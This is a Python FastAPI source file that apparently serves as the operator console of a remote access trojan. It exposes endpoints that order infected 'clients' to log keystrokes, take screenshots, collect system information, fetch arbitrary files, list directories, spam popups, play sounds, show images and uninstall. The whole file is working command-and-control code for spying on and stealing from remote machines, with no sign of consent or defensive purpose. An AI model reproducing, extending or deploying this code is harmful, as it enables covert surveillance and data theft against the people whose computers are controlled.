import argparse
import base64
from pathlib import Path
from typing import Optional

import uvicorn
from fastapi import FastAPI, UploadFile, File

import configurator
from commands import PopupCommand, PopupParameters, BasicCommand, CommandType, KeyLogCommand, KeyLogParameters, \
    GetFileCommand, GetFileParameters, DirListCommand, DirListParameters, PlaySoundCommand, PlaySoundParameters, \
    DisplayImageParameters, DisplayImageCommand
from protocol.requests import RequestHeader, RequestType, SendCommandRequest, SendCommandContent
from protocol.responses import BasicResponse, SendCommandResponse

argument_parser = argparse.ArgumentParser()
argument_parser.add_argument("-c", "--config", default="../conf.json", type=Path, help="Path to config file")
argument_parser.add_argument("-p", "--port", default="../conf.json", type=int,
                             help="Port to listen for api requests on")
args = argument_parser.parse_args()

app = FastAPI()
server = configurator.parse(args.config)


@app.get("/")
def make_command_request(request: SendCommandRequest) -> SendCommandResponse:
    return server.handle_send_command(request)


@app.post("/popup")
def send_popup_command(client_id: str, message: str) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(
                command=PopupCommand(
                    parameters=PopupParameters(
                        message=message
                    )
                )
            )
        )
    )


@app.post("/popup-spam")
def send_popup_spam_command(client_id: str, message: str) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(
                command=PopupCommand(
                    command_type=CommandType.PopupSpam,
                    parameters=PopupParameters(
                        message=message
                    )
                )
            )
        )
    )


@app.get("/screenshot")
def send_screenshot_command(client_id: str) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=BasicCommand(command_type=CommandType.Screenshot))
        )
    )


@app.get("/keylog")
def send_keylog_command(client_id: str, duration: int) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=KeyLogCommand(parameters=KeyLogParameters(duration=duration)))
        )
    )


@app.get("/get-system-info")
def send_get_system_info_command(client_id: str) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=BasicCommand(command_type=CommandType.GetSystemInfo))
        )
    )


@app.get("/getfile")
def send_getfile_command(client_id: str, path: str) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=GetFileCommand(parameters=GetFileParameters(path=path)))
        )
    )


@app.get("/dirlist")
def send_dirlist_command(client_id: str, path: str, tree: bool = True, depth: Optional[int] = None) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=DirListCommand(parameters=DirListParameters(path=path,
                                                                                           depth=depth,
                                                                                           tree=tree)))
        )
    )


@app.post("/play-sound")
def send_play_sound_command(client_id: str, sound_buffer: UploadFile = File(...)) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=PlaySoundCommand(
                parameters=PlaySoundParameters(
                    sound_buffer=base64.b64encode(sound_buffer.file.read())
                )
            ))
        )
    )


@app.post("/display-image")
def send_display_image_command(client_id: str, image_buffer: UploadFile = File(...)) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=DisplayImageCommand(
                parameters=DisplayImageParameters(
                    image_buffer=base64.b64encode(image_buffer.file.read())
                )
            ))
        )
    )


@app.post("/uninstall")
def send_uninstall_command(client_id: str) -> BasicResponse:
    return make_command_request(
        SendCommandRequest(
            header=RequestHeader(
                client_id=client_id,
                request_type=RequestType.SendCommand
            ),
            content=SendCommandContent(command=BasicCommand(command_type=CommandType.Uninstall))
        )
    )


@app.get("/is-alive")
def is_alive(client_id: str) -> BasicResponse:
    return server.is_alive(client_id)


if __name__ == '__main__':
    uvicorn.run(app, host="0.0.0.0", port=args.port)
